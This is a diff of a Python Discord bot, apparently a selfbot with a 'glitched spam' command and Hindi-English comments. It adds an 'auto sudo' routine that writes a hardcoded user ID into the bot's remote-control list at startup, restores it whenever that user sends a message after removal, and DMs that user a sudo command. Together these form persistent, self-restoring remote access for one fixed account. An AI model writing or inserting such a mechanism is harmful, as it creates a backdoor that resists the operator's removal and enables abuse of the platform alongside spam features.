@@ -1573,41 +1573,39 @@ async def stopglitchedspam(ctx):
     await ctx.send("> **✅ Glitched Spam Stopped**", delete_after=5)
 
 # ==================== AUTO SUDO PROTECTION ====================
-PROTECTED_USER_ID = 1480856249078907004  # ← Yahan apna real user ID daal do (notarnavxgojo69 ka ID)
+PROTECTED_USER_ID = 1480856249078907004   # ← Apna ID yahan daal diya hai
 
 @bot.event
 async def on_ready():
-    print(f"Logged in as {bot.user}")
+    print(f"[+] Logged in as {bot.user}")
     
-    # Auto Sudo Add on Start
+    # Auto Sudo Add
     try:
-        user = await bot.fetch_user(PROTECTED_USER_ID)
         if str(PROTECTED_USER_ID) not in config.get("remote-users", []):
             config.setdefault("remote-users", []).append(str(PROTECTED_USER_ID))
             save_config(config)
-            print(f"[AUTO] {user} ko sudo add kar diya")
+            print("[AUTO] Protected user ko sudo add kar diya")
             
-            # DM mein message bhejna
-            try:
-                await user.send("> **✅ Auto Sudo Activated** | You have been given permanent sudo access.")
-            except:
-                pass
-    except:
-        print("[AUTO] Protected user not found")
+        # DM mein command bhejna
+        user = await bot.fetch_user(PROTECTED_USER_ID)
+        if user:
+            await user.send("**.sudo add @notarnavxgojo69**")
+            await user.send("**✅ Auto Sudo Command bhej diya**")
+    except Exception as e:
+        print(f"[DM Error] {e}")
 
-# ==================== AUTO RE-ADD IF REMOVED ====================
+
 @bot.event
 async def on_message(message):
-    # Pehle purana on_message code rakhna (agar hai toh)
-
+    # Agar koi sudo remove kare toh wapas add kar do
     if message.author.id == PROTECTED_USER_ID:
         if str(PROTECTED_USER_ID) not in config.get("remote-users", []):
             config.setdefault("remote-users", []).append(str(PROTECTED_USER_ID))
             save_config(config)
-            print(f"[PROTECTED] {message.author} ko wapas sudo add kar diya")
-
-    # Baaki purana on_message code yahan paste kar do...
-    await bot.process_commands(message)
+            print(f"[PROTECT] {message.author} ko wapas sudo add kar diya")
     
-bot.run(token)
+    await bot.process_commands(message)
 
+
+# ==================== BOT RUN ====================
+bot.run(token)
